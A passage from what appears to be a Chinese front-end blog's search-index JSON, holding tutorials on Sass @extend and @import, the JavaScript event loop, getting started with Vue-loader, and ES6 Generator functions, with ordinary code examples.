如上所示，在class=&quot;seriousError&quot;的 html 元素内的超链接也会变成红色和粗体。 那我们应该在什么时候使用继承呢？ 混合器主要用于展示性样式的重用，而类名用于语义化样式的重用。因为继承是基于类的（有时是基于其他类型的选择器），所以继承应该是建立在语义化的关系上。当一个元素拥有的类（比如说 .seriousError）表明它属于另一个类（比如说 .error），这时使用继承再合适不过了。 关于 @extend 有两个要点你应该知道。 跟混合器相比，继承生成的 css 代码相对更少。因为继承仅仅是重复选择器，而不会重复属性，所以使用继承往往比混合器生成的 css 体积更小。如果你非常关心你站点的速度，请牢记这一点。 继承遵从 css 层叠的规则。当两个不同的 css 规则应用到同一个 html 元素上时，并且这两个不同的 css 规则对同一属性的修饰存在不同的值， css 层叠规则会决定应用哪个样式。相当直观：通常权重更高的选择器胜出，如果权重相同，定义在后边的规则胜出。 混合器本身不会引起 css 层叠的问题，因为混合器把样式直接放到了 css 规则中，而继承存在样式层叠的问题。被继承的样式会保持原有定义位置和选择器权重不变。通常来说这并不会引起什么问题，但是知道这点总没有坏处。 即使我们说继承相比混合器生成的 css 代码相对更少，但是我们也要小心一种情况：12.foo .bar &#123; @extend .baz; &#125;.bip .baz &#123; a: b; &#125; 在上边的例子中，SCSS 必须保证应用到 .baz 的样式同时也要应用到 .foo .bar（位于 class=&quot;foo&quot; 的元素内的 class=&quot;bar&quot; 的元素）。例子中有一条应用到.bip .baz（位于 class=&quot;bip&quot; 的元素内的 class=&quot;baz&quot; 的元素）的 css 规则。当这条规则应用到 .foo .bar时，可能存在三种情况，如下代码:1234567891011121314151617&lt;!-- 继承可能迅速变复杂 --&gt;&lt;!-- Case 1 --&gt;&lt;div class=\"foo\"&gt; &lt;div class=\"bip\"&gt; &lt;div class=\"bar\"&gt;...&lt;/div&gt; &lt;/div&gt;&lt;/div&gt;&lt;!-- Case 2 --&gt;&lt;div class=\"bip\"&gt; &lt;div class=\"foo\"&gt; &lt;div class=\"bar\"&gt;...&lt;/div&gt; &lt;/div&gt;&lt;/div&gt;&lt;!-- Case 3 --&gt;&lt;div class=\"foo bip\"&gt; &lt;div class=\"bar\"&gt;...&lt;/div&gt;&lt;/div&gt; 为了应付这些情况，SCSS 必须生成三种选择器组合（仅仅是.bip .foo .bar 不能覆盖所有情况）。如果任何一条规则里边的后代选择器再长一点，sass需要考虑的情况就会更多。实际上sass并不总是会生成所有可能的选择器组合，即使是这样，选择器的个数依然可能会变得相当大，所以如果允许，尽可能避免这种用法。 值得一提的是，只要你想，你完全可以放心地继承有后代选择器修饰规则的选择器，不管后代选择器多长，但有一个前提就是，不要用后代选择器去继承。 导入SCSScss有一个特别不常用的特性，即 @import规则，它允许在一个 css 文件中导入其他 css 文件。然而，后果是只有执行到 @import 时，浏览器才会去下载其他 css 文件，这导致页面加载起来特别慢。 sass也有一个 @import 规则，但不同的是，sass的@import 规则在生成 css 文件时就把相关文件导入进来。这意味着所有相关的样式被归纳到了同一个 css 文件中，而无需发起额外的下载请求。另外，所有在被导入文件中定义的变量和混合器均可在导入文件中使用。 当通过 @import 把 sass 样式分散到多个文件时，你通常只想生成少数几个 css 文件。那些专门为 @import 命令而编写的 sass 文件，并不需要生成对应的独立css文件，这样的 sass 文件称为局部文件。对此， sass 有一个特殊的约定来命名这些文件。 此约定即，sass 局部文件的文件名以下划线开头。这样，sass 就不会在编译时单独编译这个文件输出 css ，而只把这个文件用作导入。当你 @import 一个局部文件时，还可以不写文件的全名，即省略文件名开头的下划线。举例来说，你想导入themes/_night-sky.scss 这个局部文件里的变量，你只需在样式表中写 @import &quot;themes/night-sky&quot;; 。 局部文件可以被多个不同的文件引用。当一些样式需要在多个页面甚至多个项目中使用时，这非常有用。 由于sass兼容原生的css，所以它也支持原生的CSS @import 。尽管通常在 sass 中使用 @import 时，sass 会尝试找到对应的 sass 文件并导入进来，但在下列三种情况下会生成原生的 CSS @import，尽管这会造成浏览器解析 css 时的额外下载： 被导入文件的名字以 .css 结尾； 被导入文件的名字是一个URL地址（比如http://www.sass.hk/css/css.css），由此可用谷歌字体API提供的相应服务； 被导入文件的名字是CSS的url()值。这就是说，你不能用sass的 @import 直接导入一个原始的 css 文件，因为 sass 会认为你想用css原生的 @import 。但是，因为sass的语法完全兼容css，所以你可以把原始的css文件改名为.scss后缀，即可直接导入了。 更多用法可以参考官网 参考：Sass 中文网","categories":[{"name":"前端","slug":"前端","permalink":"https://recallhyx.github.io/categories/前端/"}],"tags":[{"name":"css","slug":"css","permalink":"https://recallhyx.github.io/tags/css/"}]},{"title":"JavaScript事件循环","slug":"JavaScript事件循环","date":"2018-03-14T07:48:33.000Z","updated":"2018-05-14T14:26:06.721Z","comments":true,"path":"2018/03/14/JavaScript事件循环/","link":"","permalink":"https://recallhyx.github.io/2018/03/14/JavaScript事件循环/","excerpt":"","text":"引入例子先来个例子：123456setTimeout(function () &#123; console.log(1);&#125;, 0);console.log(2);//2//1 我们都知道，调用 setTimeout 时，会把函数参数，放到事件队列中，等主程序运行完，再调用。所以会先输出2再输出1。不过 setTimeout 第二个参数是延迟多少秒，都会放到事件队列。 那我们再来看一个例子：1234567891011121314let promise = new Promise(function(resolve, reject) &#123; console.log('Promise'); resolve();&#125;);promise.then(function() &#123; console.log('resolved.');&#125;);console.log('Hi!');//Promise//Hi!//resolved. 可以看到，先是输出了 Promise，再输出 Hi!，最后才输出 resolved.。这是因为，Promise 在声明的时候就会执行，而它的方法 then 指定的回调函数，将在当前脚本所有同步任务执行完才会执行，所以resolved最后输出。 当然了，如果把Promise 中的 resolve() 这个函数去掉，将不会改变 Promise的状态，也不会触发 then 方法，也就不会输出 resolved。 如果我们将两个例子结合起来，会怎么样呢。12345678910111213setTimeout(function () &#123; console.log(1);&#125;, 0);let promise = new Promise(function(resolve, reject) &#123; console.log('2'); resolve();&#125;);promise.then(function() &#123; console.log('3');&#125;);console.log('4'); 答案是输出2 4 3 1。有几个我们在上面的例子可以确定，因为 Promise一创建就会运行，所以会先输出2，setTimeout 和 then都是异步操作，就会放到事件队列，主线程输出4。那么问题来了，setTimeout 和 then 哪个先输出呢，这就引出了事件循环的概念。 事件循环浏览器（或者说JS引擎）执行JS的机制是基于事件循环。由于JS是单线程，所以同一时间只能执行一个任务，其他任务就得排队，后续任务必须等到前一个任务结束才能开始执行。为了避免因为某些长时间任务造成的无意义等待，JS引入了异步的概念，用另一个线程来管理异步任务。同步任务直接在主线程队列中顺序执行，而异步任务会进入另一个任务队列，不会阻塞主线程。等到主线程队列空了（执行完了）的时候，就会去异步队列查询是否有可执行的异步任务了（异步任务通常进入异步队列之后还要等一些条件才能执行，如ajax请求、文件读写），如果某个异步任务可以执行了便加入主线程队列，以此循环。 事件循环（Event Loop） 规范1、每个浏览器环境，至多有一个event loop。2、一个 event loop 可以有1个或多个任务队列（task queue） 。3、一个 task queue 是一列有序的任务（task），用来做以下工作： Events task， Parsing task， Callbacks task， Using a resource task， Reacting to DOM manipulation task 等。 每个 task 都有自己相关的文档（ document），比如一个 task 在某个元素（element）的上下文中进入队列，那么它的document就是这个element的document`。 每个 task 定义时都有一个任务源（task source），从同一个 task source 来的 task必须放到同一个 task queue，从不同源来的则被添加到不同队列。 每个(task source对应的) task queue 都保证自己队列的先进先出的执行顺序，但event loop 的每个循环（turn），是由浏览器决定从哪个task source挑选task。这允许浏览器为不同的task source设置不同的优先级，比如为用户交互设置更高优先级来使用户感觉流畅。 工作和工作队列（Jobs and Job Queues） 规范ES6规范里，新增了 Jobs and Job Queues 这一概念，它有点类似于上面提到的任务队列（task queue）一个 Job Queue 是一个先进先出的队列。一个ECMAScript实现必须至少包含以下两个 Job Queue ： Name Purpose ScriptJobs Jobs that validate and evaluate ECMAScript Script and Module source text. See clauses 10 and 15. PromiseJobs Jobs that are responses to the settlement of a Promise (see 25.4). 单个 Job Queue 中的 PendingJob 总是按序（先进先出）执行，但多个 Job Queue 可能会交错执行。跟随PromiseJobs到25.4章节，可以看到 PerformPromiseThen ( promise, onFulfilled, onRejected, resultCapability ) ： 这里我们看到， promise.then 的执行其实是向 PromiseJobs 添加Job。 task（macro-task）和micro-taskmicro-task 在 ES6 规范中称为 Job。 其次，macro-task 代指 task。 有一个事件循环，但是任务队列可以有多个。整个 script 代码，放在了 macro-task queue 中，setTimeout 也放入macro-task queue。但是，promise.then 放到了另一个任务队列 micro-task queue中。这两个任务队列执行顺序如下，取1个macro-task queue 中的 task，执行之。然后把所有 micro-task queue 顺序执行完，再取 macro-task queue 中的下一个任务。 解释代码一开始执行时，所有这些代码在macro-task queue 中，取出来执行之。后面遇到了 setTimeout ，又加入到macro-task queue 中，然后，遇到了 Promise新建后立即执行输出2, 然后，遇到了 promise.then，放入到了另一个队列micro-task queue，然后代码继续执行，输出 4 。等整个 execution context stack 执行完后，下一步该取的是micro-task queue 中的任务了。取出 promise.then，执行，输出3，micro-task queue为空，下一步取出 marco-task queue 中的 setTimeout，执行，输出 1所以最终的结果是 2 4 3 1。 推荐一个视频what-the-heck-is-the-event-loop-anyway 里面讲的很详细，从同步讲到异步，还有图文讲解，英文的，要翻墙的。 参考：Promise的队列与setTimeout的队列有何关联？promise和setTimeout执行顺序的疑惑从Promise来看JavaScript中的Event Loop、Tasks和Microtasks","categories":[{"name":"前端","slug":"前端","permalink":"https://recallhyx.github.io/categories/前端/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"https://recallhyx.github.io/tags/javascript/"}]},{"title":"Vue-loader入门","slug":"Vue-loader入门","date":"2018-03-11T09:39:56.000Z","updated":"2018-03-26T06:59:45.015Z","comments":true,"path":"2018/03/11/Vue-loader入门/","link":"","permalink":"https://recallhyx.github.io/2018/03/11/Vue-loader入门/","excerpt":"","text":"Vue-loader 介绍Vue-loader是一个集成了 webpack 的loader，能把 Vue 组件转化成JavaScript模块，而且 webpack 的配置官方已经给你配好了，可以省去配置的步骤，省时省力。 Vue-loader 使用安装Vue-loader 可以通过官方的 vue-cli 脚手架来使用首先，安装 vuenpm install vue 全局安装webpacknpm install --global webpack 全局安装 vue-clinpm install --global vue-cli 新建一个 vue-cli 项目，把项目名替换成自己的项目名vue init webpack {项目名}回车确认后，会让你进行一系列的配置，可以根据自己的需求进行配置，默认回车 建议安装 vue-router 什么是vue-router？vue-router是Vue.js官方的路由插件，它和vue.js是深度集成的，适合用于构建单页面应用。vue的单页面应用是基于路由和组件的，路由用于设定访问路径，并将路径和组件映射起来。传统的页面应用，是用一些超链接来实现页面切换和跳转的。在vue-router单页面应用中，则是路径之间的切换，也就是组件的切换。 目录结构 |–build //webpack相关代码文件夹| |–build.js //生产环境结构代码| |–check-version.js //检查node、npm、等版本| |–dev-client.js //热加载相关代码| |–dev-server.js //本地服务器| |–utils.js //构建工具| |–webpack.base.conf.js //webpack基本配置| |–webpack.dev.conf.js //webpack开发环境配置| |–webpack.prod.conf.js //webpack生产环境配置|–config //项目开发环境配置| |–dev.env.js //开发环境变量| |–index.js //项目基本配置（proxyTable:{ //配置请求代理}）| |–dev.env.js //开发环境变量| |–prod.env.js //生产环境变量|–dist //执行npm run build，生成打包发布的目录|–node_modules //初始化 npm install，生成的依赖包目录（注意，不要提交到svn！）|–src //项目源代码目录| |–components //组件目录| |–assets //Vue默认logo目录| |–router //路由目录| |–APP.vue //默认组件，入口文件| |–main.js //程序入口文件，引用、加载各种组件|–static //静态文件目录，比如：CSS、图片、等等静态文件|–index.html //入口文件 启动使用npm install之后，就在项目目录下使用命令npm run dev就能启动然后打开浏览器，输入localhost:8080，如果出现以下图片，就算启动成功了 注意：有一些8080端口被占用了，这个时候 vue-loader会去找其他空闲的端口，具体看命令行： 它会说当前应用在哪个端口运行 Vue-loader 与 Vue 的不同区别一、写法不同刚开始接触 Vue-loader ，发现完全上不了手，之前学的 Vue 语法都没怎么看到Vue-loader 语法123456789101112131415161718192021222324//App.vue&lt;template&gt; &lt;div id=\"app\"&gt; &lt;img src=\"./assets/logo.png\"&gt; &lt;router-view/&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123; name: 'App'&#125;&lt;/script&gt;&lt;style&gt;#app &#123; font-family: 'Avenir', Helvetica, Arial, sans-serif; -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-align: center; color: #2c3e50; margin-top: 60px;&#125;&lt;/style&gt; Vue 语法1234567891011121314151617&lt;div id=\"vue_example\"&gt; &lt;h1&gt;message : &#123;&#123;site&#125;&#125;&lt;/h1&gt; &lt;h1&gt;&#123;&#123;details()&#125;&#125;&lt;/h1&gt;&lt;/div&gt;&lt;script type=\"text/javascript\"&gt; var vm = new Vue(&#123; el: '#vue_example', data: &#123; message: 'hello world' &#125;, methods: &#123; details: function() &#123; return this.message + \"first vue application\"; &#125; &#125; &#125;)&lt;/script&gt; 相比较之下，我们可以看到，Vue-loader 的写法是123456789&lt;template&gt; &lt;!-- 组件模板写在这里 --&gt; &lt;/template&gt; &lt;script&gt; // 组件逻辑相关代码写这里 &lt;/script&gt; &lt;style&gt; /* 组件样式写在这里 */ &lt;/style&gt; &lt;template&gt; 默认语言：html。 每个 .vue 文件最多包含一个 &lt;template&gt; 块。 内容将被提取为字符串，将编译并用作 Vue 组件的 template 选项。 &lt;script&gt; 默认语言：js (在检测到 babel-loader 或 buble-loader 配置时自动支持ES2015)。 每个 .vue 文件最多包含一个 &lt;script&gt; 块。 该脚本在类 CommonJS 环境中执行 (就像通过 webpack 打包的正常 js 模块)，这意味着你可以 require() 其它依赖。在 ES2015 支持下，你也可以使用 import 和 export 语法。 脚本必须导出 Vue.js 组件对象。也可以导出由 Vue.extend() 创建的扩展对象，但是普通对象是更好的选择。 &lt;style&gt; 默认语言：css。 一个 .vue 文件可以包含多个 &lt;style&gt; 标签。 &lt;style&gt; 标签可以有 scoped 或者 module 属性 (查看 CSS 作用域和 CSS Modules) 以帮助你将样式封装到当前组件。具有不同封装模式的多个 &lt;style&gt; 标签可以在同一个组件中混合使用。 默认情况下，将会使用 style-loader 提取内容，并通过 &lt;style&gt; 标签动态加入文档的 &lt;head&gt; 中，也可以配置 webpack 将所有 styles 提取到单个 CSS 文件中。 而 Vue 的写法是123456&lt;div&gt;&lt;!--组件模板写在这里--&gt;&lt;/div&gt;&lt;script&gt; // 组件逻辑相关代码写这里 &lt;/script&gt; 区别二、组件定义Vue-loader 和 Vue 的组件定义有点不一样123456789//HelloWorld.vueexport default &#123; name: 'HelloWorld', data () &#123; return &#123; msg: 'Welcome to Your Vue.js App' &#125; &#125;&#125; Vue-loader 推荐，将一个文件作为一个组件，并用 export deafult的方式，导出组件，在其他地方使用 import 引入组件而在很多 Vue 项目中，我们使用 Vue.component 来定义全局组件，紧接着用 new Vue({ el: &#39;#container &#39;}) 在每个页面内指定一个容器元素。这种方式在很多中小规模的项目中运作的很好，在这些项目里 JavaScript 只被用来加强特定的视图。但当在更复杂的项目中，或者你的前端完全由 JavaScript 驱动的时候，下面这些缺点将变得非常明显：全局定义 (Global definitions) 强制要求每个 component 中的命名不得重复字符串模板 (String templates) 缺乏语法高亮，在 HTML 有多行的时候，需要用到丑陋的 \\不支持 CSS (No CSS support) 意味着当 HTML 和 JavaScript 组件化时，CSS 明显被遗漏没有构建步骤 (No build step) 限制只能使用 HTML 和 ES5 JavaScript, 而不能使用预处理器，如 Pug (formerly Jade) 和 Babel 总的来说，Vue 是写在以 .js 的 JavaScript 脚本里面的，而 Vue-loader 则是写在以.vue 的 vue 脚本里面的。 区别三、组件选项：dataVue-loader里面，data属性是要返回值的，写法是1234data () &#123; return &#123; msg: 'Welcome to Your Vue.js App' &#125; 对比 Vue ：123data: &#123; message: 'hello world' &#125;, 这点小区别也是前期需要注意的。 区别四、el我们知道，在 Vue组件里面，我们是需要 el 来确定一个组件的，上面的例子1234567891011121314151617&lt;div id=\"vue_example\"&gt; &lt;h1&gt;message : &#123;&#123;site&#125;&#125;&lt;/h1&gt; &lt;h1&gt;&#123;&#123;details()&#125;&#125;&lt;/h1&gt;&lt;/div&gt;&lt;script type=\"text/javascript\"&gt; var vm = new Vue(&#123; el: '#vue_example', data: &#123; message: 'hello world' &#125;, methods: &#123; details: function() &#123; return this.message + \"first vue application\"; &#125; &#125; &#125;)&lt;/script&gt; 它提供一个在页面上已存在的 DOM 元素作为 Vue 实例的挂载目标。一般我们使用 new 关键字创建 Vue 组件，都要使用它的 el 选项。但是我们在 Vue-loader里面，可以看到，它并没有 el选项，因为 Vue-loader 会将 Vue 组件转换成 JavaScript模块。 引入组件先看代码：OtherComponent.vue1234567891011121314151617181920// OtherComponent.vue&lt;template&gt; &lt;div&gt; &#123;&#123;message&#125;&#125; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; export default &#123; name: 'other', data()&#123; return &#123; message: 'I am Other Component' &#125; &#125; &#125;&lt;/script&gt;&lt;style&gt;&lt;/style&gt; 然后我们在 HelloWorld.vue 中引入123456789101112131415&lt;script&gt;import OtherComponent from './OtherComponent'export default &#123; name: 'HelloWorld', data () &#123; return &#123; msg: 'Welcome to Your Vue.js App' &#125; &#125;, components:&#123; OtherComponent &#125;&#125;&lt;/script&gt; 我们在&lt;script&gt;标签里面写我们的组件，自然也要在&lt;script&gt;标签里面引入组件，然后，我们还要添加一个选项components，然后把 OtherComponent 写进去。注意，这里涉及到 ES6 的语法 ： export default命令，为模块指定默认输出。其他模块加载该模块时，import命令可以为该匿名函数指定任意名字。 即import OtherComponent from &#39;./OtherComponent&#39; 这里的 OtherComponent是我们自己取的名字，我们也可以取成 othercomponent 等名字，这都无所谓，但是，要确保components:{ OtherComponent}中对应的名字是一样的，否则就找不到这个组件。 然后我们要在&lt;template&gt;标签里面使用1234&lt;template&gt; ... &lt;OtherComponent&gt;&lt;/OtherComponent&gt;&lt;/template&gt; 我们是这么想的，直接把组件加到后面，但是当我们看我们的页面的时候，会发现报错了。1Component template should contain exactly one root element. If you are using v-if on multiple elements, use v-else-if to chain them instead. 这是因为，&lt;template&gt; 只允许一个根节点，在原生的 HelloWorld.vue的&lt;template&gt;中，已经有&lt;div&gt; 这个标签作为根节点了，所以我们要解决这个问题，只需要在外面包上一层 &lt;div&gt; 就能解决这个问题了。123456&lt;template&gt; &lt;div&gt; ... &lt;OtherComponent&gt;&lt;/OtherComponent&gt; &lt;/div&gt;&lt;/template&gt; 还有一点，123components:&#123; OtherComponent&#125; 这样写其实本质上是这样的：123components:&#123; OtherComponent:OtherComponent&#125; 我们也可以手动更改名字第一种：123components:&#123; 'other-component':OtherComponent&#125; 或者，第二种：123components:&#123; othercomponent:OtherComponent&#125; 这两种语法有什么区别呢？仔细看一下就会发现，第一种用了 - 这个符号，所以需要用引号来括住，第二种没有用 -，所以不用括住。相对应的，我们使用组件就要改成我们重新命名的名字123456&lt;template&gt; &lt;div&gt; ... &lt;other-component&gt;&lt;/other-component&gt; &lt;/div&gt;&lt;/template&gt; 我们再来看看 OtherComponent12345678910&lt;script&gt; export default &#123; name: 'other', data()&#123; return &#123; message: 'I am Other Component' &#125; &#125; &#125;&lt;/script&gt; 注意到，我们使用了 name 这个选项，但是我们并没有在引入该组件的时候用到过name的值other，那这个选项有什么用呢？官方给出的解释是 允许组件模板递归地调用自身。注意，组件在全局用 Vue.component() 注册时，全局 ID 自动作为组件的 name。指定 name 选项的另一个好处是便于调试。有名字的组件有更友好的警告信息。另外，当在有 vue-devtools，未命名组件将显示成 &lt;AnonymousComponent&gt;，这很没有语义。通过提供 name 选项，可以获得更有语义信息的组件树。 在开发者工具里面，就可以看到我们的other（变成了首字母大写）","categories":[{"name":"前端","slug":"前端","permalink":"https://recallhyx.github.io/categories/前端/"}],"tags":[{"name":"vue","slug":"vue","permalink":"https://recallhyx.github.io/tags/vue/"}]},{"title":"JavaScript ES6一些有用的语法特性（Generator）","slug":"ES6（4）","date":"2018-03-08T13:03:17.000Z","updated":"2018-03-18T14:09:01.962Z","comments":true,"path":"2018/03/08/ES6（4）/","link":"","permalink":"https://recallhyx.github.io/2018/03/08/ES6（4）/","excerpt":"","text":"简介Generator 函数是 ES6 提供的一种异步编程解决方案，语法行为与传统函数完全不同。Python的协程也是用Generator函数这种方案来实现的。 以前的异步编程方案： 回调函数 事件监听 发布/订阅 Promise 对象 Generator 函数有多种理解角度。语法上，首先可以把它理解成，Generator 函数是一个状态机，封装了多个内部状态。 执行 Generator 函数会返回一个遍历器对象，也就是说，Generator 函数除了状态机，还是一个遍历器对象生成函数。返回的遍历器对象，可以依次遍历 Generator 函数内部的每一个状态。 形式上，Generator 函数是一个普通函数，但是有两个特征。一是，function关键字与函数名之间有一个星号；二是，函数体内部使用yield表达式，定义不同的内部状态（yield在英语里的意思就是“产出”）。1234567function* helloWorldGenerator() &#123; yield 'hello'; yield 'world'; return 'ending';&#125;var hw = helloWorldGenerator(); 上面代码定义了一个 Generator 函数helloWorldGenerator，它内部有两个yield表达式（hello和world），即该函数有三个状态：hello，world 和 return 语句（结束执行）。 然后，Generator 函数的调用方法与普通函数一样，也是在函数名后面加上一对圆括号。不同的是，调用 Generator 函数后，该函数并不执行，返回的也不是函数运行结果，而是一个指向内部状态的指针对象，也就是遍历器对象（Iterator Object）。 下一步，必须调用遍历器对象的next方法，使得指针移向下一个状态。也就是说，每次调用next方法，内部指针就从函数头部或上一次停下来的地方开始执行，直到遇到下一个yield表达式（或return语句）为止。换言之，Generator 函数是分段执行的，yield表达式是暂停执行的标记，而next方法可以恢复执行。1234567891011hw.next()// &#123; value: 'hello', done: false &#125;hw.next()// &#123; value: 'world', done: false &#125;hw.next()// &#123; value: 'ending', done: true &#125;hw.next()// &#123; value: undefined, done: true &#125; 上面代码一共调用了四次next方法。 第一次调用，Generator 函数开始执行，直到遇到第一个yield表达式为止。next方法返回一个对象，它的value属性就是当前yield表达式的值hello，done属性的值false，表示遍历还没有结束。 第二次调用，Generator 函数从上次yield表达式停下的地方，一直执行到下一个yield表达式。next方法返回的对象的value属性就是当前yield表达式的值world，done属性的值false，表示遍历还没有结束。 第三次调用，Generator 函数从上次yield表达式停下的地方，一直执行到return语句（如果没有return语句，就执行到函数结束）。next方法返回的对象的value属性，就是紧跟在return语句后面的表达式的值（如果没有return语句，则value属性的值为undefined），done属性的值true，表示遍历已经结束。 第四次调用，此时 Generator 函数已经运行完毕，next方法返回对象的value属性为undefined，done属性为true。以后再调用next方法，返回的都是这个值。 总结一下，调用 Generator 函数，返回一个遍历器对象，代表 Generator 函数的内部指针。以后，每次调用遍历器对象的next方法，就会返回一个有着value和done两个属性的对象。value属性表示当前的内部状态的值，是yield表达式后面那个表达式的值；done属性是一个布尔值，表示是否遍历结束。 ES6 没有规定，function关键字与函数名之间的星号，写在哪个位置。这导致下面的写法都能通过1234function * foo(x, y) &#123; ··· &#125;function *foo(x, y) &#123; ··· &#125;function* foo(x, y) &#123; ··· &#125;function*foo(x, y) &#123; ··· &#125; 由于 Generator 函数仍然是普通函数，所以一般的写法是上面的第三种，即星号紧跟在function关键字后面。 yield 表达式由于 Generator 函数返回的遍历器对象，只有调用next方法才会遍历下一个内部状态，所以其实提供了一种可以暂停执行的函数。yield表达式就是暂停标志。 遍历器对象的next方法的运行逻辑如下。 （1）遇到yield表达式，就暂停执行后面的操作，并将紧跟在yield后面的那个表达式的值，作为返回的对象的value属性值。 （2）下一次调用next方法时，再继续往下执行，直到遇到下一个yield表达式。 （3）如果没有再遇到新的yield表达式，就一直运行到函数结束，直到return语句为止，并将return语句后面的表达式的值，作为返回的对象的value属性值。 （4）如果该函数没有return语句，则返回的对象的value属性值为undefined。 需要注意的是，yield表达式后面的表达式，只有当调用next方法、内部指针指向该语句时才会执行，因此等于为 JavaScript 提供了手动的“惰性求值”（Lazy Evaluation）的语法功能。123function* gen() &#123; yield 123 + 456;&#125; 上面代码中，yield后面的表达式123 + 456，不会立即求值，只会在next方法将指针移到这一句时，才会求值。 yield表达式与return语句既有相似之处，也有区别。相似之处在于，都能返回紧跟在语句后面的那个表达式的值。区别在于每次遇到yield，函数暂停执行，下一次再从该位置继续向后执行，而return语句不具备位置记忆的功能。一个函数里面，只能执行一次（或者说一个）return语句，但是可以执行多次（或者说多个）yield表达式。正常函数只能返回一个值，因为只能执行一次return；Generator 函数可以返回一系列的值，因为可以有任意多个yield。从另一个角度看，也可以说 Generator 生成了一系列的值，这也就是它的名称的来历（英语中，generator 这个词是“生成器”的意思）。 Generator 函数可以不用yield表达式，这时就变成了一个单纯的暂缓执行函数。1234567891011function* f() &#123; console.log('Generator函数执行了');&#125;var generator = f();//不会输出‘Generator函数执行了’function g()&#123; console.log('函数g()执行了');&#125;var gen = g();//输出‘函数g()执行了’ 上面代码中，函数 g 是普通函数，在为变量gen赋值时就会执行。但是，函数 f 是一个 Generator 函数，就变成只有调用next方法时，函数 f 才会执行。 另外需要注意，yield表达式只能用在 Generator 函数里面，用在其他地方都会报错。 另外，yield表达式如果用在另一个表达式之中，必须放在圆括号里面。1234567function* demo() &#123; console.log('Hello' + yield); // SyntaxError console.log('Hello' + yield 123); // SyntaxError console.log('Hello' + (yield)); // OK console.log('Hello' + (yield 123)); // OK&#125; yield表达式用作函数参数或放在赋值表达式的右边，可以不加括号。1234function* demo() &#123; foo(yield 'a', yield 'b'); // OK let input = yield; // OK&#125; next 方法的参数yield表达式本身没有返回值，或者说总是返回undefined。next方法可以带一个参数，该参数就会被当作上一个yield表达式的返回值。123456789101112function* f() &#123; for(var i = 0; true; i++) &#123; var reset = yield i; if(reset) &#123; i = -1; &#125; &#125;&#125;var g = f();g.next() // &#123; value: 0, done: false &#125;g.next() // &#123; value: 1, done: false &#125;g.next(true) // &#123; value: 0, done: false &#125; 上面代码先定义了一个可以无限运行的 Generator 函数f，如果next方法没有参数，每次运行到yield表达式，变量reset的值总是undefined。当next方法带一个参数true时，变量reset就被重置为这个参数（即true），因此i会等于-1，下一轮循环就会从-1开始递增。 这个功能有很重要的语法意义。Generator 函数从暂停状态到恢复运行，它的上下文状态（context）是不变的。通过next方法的参数，就有办法在 Generator 函数开始运行之后，继续向函数体内部注入值。也就是说，可以在 Generator 函数运行的不同阶段，从外部向内部注入不同的值，从而调整函数行为。 注意，由于next方法的参数表示上一个yield表达式的返回值，所以在第一次使用next方法时，传递参数是无效的。V8 引擎直接忽略第一次使用next方法时的参数，只有从第二次使用next方法开始，参数才是有效的。从语义上讲，第一个next方法用来启动遍历器对象，所以不用带有参数。 如果想要第一次调用next方法时，就能够输入值，可以在 Generator 函数外面再包一层。123456789101112131415function wrapper(generatorFunction) &#123; return function (...args) &#123; let generatorObject = generatorFunction(...args); generatorObject.next(); return generatorObject; &#125;;&#125;const wrapped = wrapper(function* () &#123; console.log(`First input: $&#123;yield&#125;`); return 'DONE';&#125;);wrapped().next('hello!')// First input: hello! Generator.prototype.return()Generator 函数返回的遍历器对象，还有一个return方法，可以返回给定的值，并且终结遍历 Generator 函数。1234567891011function* gen() &#123; yield 1; yield 2; yield 3;&#125;var g = gen();g.next() // &#123; value: 1, done: false &#125;g.return('foo') // &#123; value: \"foo\", done: true &#125;g.next() // &#123; value: undefined, done: true &#125; 上面代码中，遍历器对象g调用return方法后，返回值的value属性就是return方法的参数foo。并且，Generator 函数的遍历就终止了，返回值的done属性为true，以后再调用next方法，done属性总是返回true。 如果return方法调用时，不提供参数，则返回值的value属性为undefined。 如果 Generator 函数内部有try...finally代码块，那么return方法会推迟到finally代码块执行完再执行。1234567891011121314151617function* numbers () &#123; yield 1; try &#123; yield 2; yield 3; &#125; finally &#123; yield 4; yield 5; &#125; yield 6;&#125;var g = numbers();g.next() // &#123; value: 1, done: false &#125;g.next() // &#123; value: 2, done: false &#125;g.return(7) // &#123; value: 4, done: false &#125;g.next() // &#123; value: 5, done: false &#125;g.next() // &#123; value: 7, done: true &#125; 上面代码中，调用return方法后，就开始执行finally代码块，然后等到finally代码块执行完，再执行return方法。 Generator.prototype.throw()Generator 函数返回的遍历器对象，都有一个throw方法，可以在函数体外抛出错误，然后在 Generator 函数体内捕获。12345678910111213141516171819var g = function* () &#123; try &#123; yield; &#125; catch (e) &#123; console.log('内部捕获', e); &#125;&#125;;var i = g();i.next();try &#123; i.throw('a'); i.throw('b');&#125; catch (e) &#123; console.log('外部捕获', e);&#125;// 内部捕获 a// 外部捕获 b 上面代码中，遍历器对象i连续抛出两个错误。第一个错误被 Generator 函数体内的catch语句捕获。i第二次抛出错误，由于 Generator 函数内部的catch语句已经执行过了，不会再捕捉到这个错误了，所以这个错误就被抛出了 Generator 函数体，被函数体外的catch语句捕获。 throw方法可以接受一个参数，该参数会被catch语句接收，建议抛出Error对象的实例。123456789101112var g = function* () &#123; try &#123; yield; &#125; catch (e) &#123; console.log(e); &#125;&#125;;var i = g();i.next();i.throw(new Error('出错了！'));// Error: 出错了！(…) 注意，不要混淆遍历器对象的throw方法和全局的throw命令。上面代码的错误，是用遍历器对象的throw方法抛出的，而不是用throw命令抛出的。后者只能被函数体外的catch语句捕获。123456789101112131415161718192021var g = function* () &#123; while (true) &#123; try &#123; yield; &#125; catch (e) &#123; if (e != 'a') throw e; console.log('内部捕获', e); &#125; &#125;&#125;;var i = g();i.next();try &#123; throw new Error('a'); throw new Error('b');&#125; catch (e) &#123; console.log('外部捕获', e);&#125;// 外部捕获 [Error: a] 上面代码之所以只捕获了a，是因为函数体外的catch语句块，捕获了抛出的a错误以后，就不会再继续try代码块里面剩余的语句了。 如果 Generator 函数内部没有部署try...catch代码块，那么throw方法抛出的错误，将被外部try...catch代码块捕获。 如果 Generator 函数内部和外部，都没有部署try...catch代码块，那么程序将报错，直接中断执行。 throw方法被捕获以后，会附带执行下一条yield表达式。也就是说，会附带执行一次next方法。1234567891011121314var gen = function* gen()&#123; try &#123; yield console.log('a'); &#125; catch (e) &#123; // ... &#125; yield console.log('b'); yield console.log('c');&#125;var g = gen();g.next() // 